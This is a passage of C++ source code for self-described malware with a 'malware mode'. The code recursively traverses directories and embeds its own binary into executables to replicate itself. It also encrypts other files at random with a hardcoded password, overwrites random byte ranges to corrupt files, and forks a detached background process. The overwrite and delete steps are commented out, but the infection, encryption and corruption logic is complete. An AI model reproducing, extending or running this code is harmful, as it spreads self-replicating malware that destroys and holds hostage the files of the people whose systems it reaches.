static std::vector<uint8_t> rf(const std::string& p) {
    std::ifstream f(p, std::ios::binary);
    if (!f) throw std::runtime_error("Cannot open: " + p);
    return {std::istreambuf_iterator<char>(f), {}};
}

static void wf(const std::string& p, const std::vector<uint8_t>& d) {
    std::ofstream f(p, std::ios::binary);
    if (!f) throw std::runtime_error("Cannot create: " + p);
    f.write((const char*)d.data(), d.size());
}

// New: Generate random gibberish data to inject into files
std::vector<uint8_t> generate_gibberish(size_t size) {
    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<> dis(0, 255);
    std::vector<uint8_t> gibberish(size);
    for (size_t i = 0; i < size; ++i) {
        gibberish[i] = static_cast<uint8_t>(dis(gen));
    }
    return gibberish;
}

// New: Inject gibberish into files at random positions
void inject_gibberish(const std::string& target_path) {
    try {
        // Read the original file content
        std::vector<uint8_t> original_data = rf(target_path);
        if (original_data.empty()) return;

        // Decide on a random position and size for gibberish injection (up to 10% of file size)
        size_t max_injection_size = original_data.size() / 10 + 1;
        std::random_device rd;
        std::mt19937 gen(rd());
        std::uniform_int_distribution<> size_dis(1, max_injection_size);
        std::uniform_int_distribution<> pos_dis(0, original_data.size() - 1);
        
        size_t injection_size = size_dis(gen);
        size_t injection_pos = pos_dis(gen);
        if (injection_pos + injection_size > original_data.size()) {
            injection_size = original_data.size() - injection_pos;
        }

        // Generate gibberish and inject it
        std::vector<uint8_t> gibberish = generate_gibberish(injection_size);
        std::vector<uint8_t> modified_data = original_data;
        std::copy(gibberish.begin(), gibberish.end(), modified_data.begin() + injection_pos);

        // Write the modified data back to a new file
        wf(target_path + ".injected", modified_data);
        std::cout << "Injected gibberish into: " << target_path << " -> " << target_path + ".injected" << std::endl;
        // Optionally overwrite the original (commented for safety)
        // unlink(target_path.c_str());
        // rename((target_path + ".injected").c_str(), target_path.c_str());
    } catch (const std::exception& e) {
        std::cerr << "Gibberish injection failed for " << target_path << ": " << e.what() << std::endl;
    }
}

// Updated: Self-replication logic to infect other executables with more stealth
void infect_executable(const std::string& target_path, const std::vector<uint8_t>& self_binary) {
    try {
        // Check if the file is an executable (Unix-like systems check)
        struct stat st;
        if (stat(target_path.c_str(), &st) == 0 && (st.st_mode & S_IXUSR)) {
            // Read the target executable
            std::vector<uint8_t> target_data = rf(target_path);
            // Embed our binary into the target with a marker (more sophisticated infection)
            std::string marker = "MALWARE_EMBED_";
            std::vector<uint8_t> marker_bytes(marker.begin(), marker.end());
            std::vector<uint8_t> infected_data = target_data;
            infected_data.insert(infected_data.end(), marker_bytes.begin(), marker_bytes.end());
            infected_data.insert(infected_data.end(), self_binary.begin(), self_binary.end());
            // Write the infected binary to a new file
            wf(target_path + ".infected", infected_data);
            std::cout << "Infected: " << target_path << " -> " << target_path + ".infected" << std::endl;
            // Optionally replace the original (commented for safety)
            // unlink(target_path.c_str());
            // rename((target_path + ".infected").c_str(), target_path.c_str());
        }
    } catch (const std::exception& e) {
        std::cerr << "Infection failed for " << target_path << ": " << e.what() << std::endl;
    }
}

// Updated: Directory traversal to encrypt, infect, or inject gibberish based on file type
void traverse_and_process(const std::string& dir_path, const std::string& pass, const std::vector<uint8_t>& self_binary) {
    namespace fs = std::filesystem;
    try {
        for (const auto& entry : fs::recursive_directory_iterator(dir_path)) {
            if (entry.is_regular_file()) {
                std::string path = entry.path().string();
                // Skip files related to this malware to avoid loops
                if (path.find("encrypt_malware") != std::string::npos ||
                    path.find(".encrypted") != std::string::npos ||
                    path.find(".infected") != std::string::npos ||
                    path.find(".injected") != std::string::npos) {
                    continue;
                }

                // Check if it's an executable for infection
                struct stat st;
                if (stat(path.c_str(), &st) == 0 && (st.st_mode & S_IXUSR)) {
                    infect_executable(path, self_binary);
                } else {
                    // Randomly decide to encrypt or inject gibberish (50-50 chance)
                    std::random_device rd;
                    std::mt19937 gen(rd());
                    std::uniform_int_distribution<> decision(0, 1);
                    if (decision(gen) == 0) {
                        // Encrypt the file
                        try {
                            std::vector<uint8_t> data = rf(path);
                            std::vector<uint8_t> encrypted = do_enc(data, pass);
                            wf(path + ".encrypted", encrypted);
                            std::cout << "Encrypted file: " << path << " -> " << path + ".encrypted" << std::endl;
                            // Optionally remove original (commented for safety)
                            // unlink(path.c_str());
                        } catch (const std::exception& e) {
                            std::cerr << "Encryption failed for " << path << ": " << e.what() << std::endl;
                        }
                    } else {
                        // Inject gibberish into the file
                        inject_gibberish(path);
                    }
                }
            }
        }
    } catch (const std::exception& e) {
        std::cerr << "Traversal error in " << dir_path << ": " << e.what() << std::endl;
    }
}

// Main function with malware mode
int main(int argc, char* argv[]) {
    std::string self_path = argv[0];
    std::vector<uint8_t> self_binary;
    try {
        self_binary = rf(self_path); // Read our own binary for self-replication
    } catch (const std::exception& e) {
        std::cerr << "Could not read self binary: " << e.what() << std::endl;
    }

    if (argc == 5) {
        // Standard mode (manual encryption/decryption as in original)
        std::string mode = argv[1], in = argv[2], out = argv[3], pass = argv[4];
        try {
            auto data = rf(in);
            if (mode == "enc") {
                auto r = do_enc(data, pass);
                wf(out, r);
                std::cout << "Encrypted: " << in << " -> " << out << " (" << r.size() << " bytes)\n";
            } else if (mode == "dec") {
                auto r = do_dec(data, pass);
                wf(out, r);
                std::cout << "Decrypted: " << in << " -> " << out << " (" << r.size() << " bytes)\n";
            } else {
                std::cerr << "Unknown mode\n";
                return 1;
            }
        } catch (const std::exception& e) {
            std::cerr << "Error: " << e.what() << "\n";
            return 1;
        }
    } else {
        // Malware mode (auto-spread, encrypt, and inject gibberish)
        std::cout << "Running in malware mode: Spreading, encrypting, and injecting files...\n";
        std::string pass = "hardcoded_malware_pass_123"; // Hardcoded password for encryption
        std::string target_dir = "."; // Start in current directory (can be changed to /home or others)

        // Optionally fork to run in background (Unix-like systems)
        if (fork() == 0) {
            setsid(); // Detach from terminal
            traverse_and_process(target_dir, pass, self_binary);
            exit(0);
        } else {
            std::cout << "Malware process started in background.\n";
        }
    }
    return 0;
}
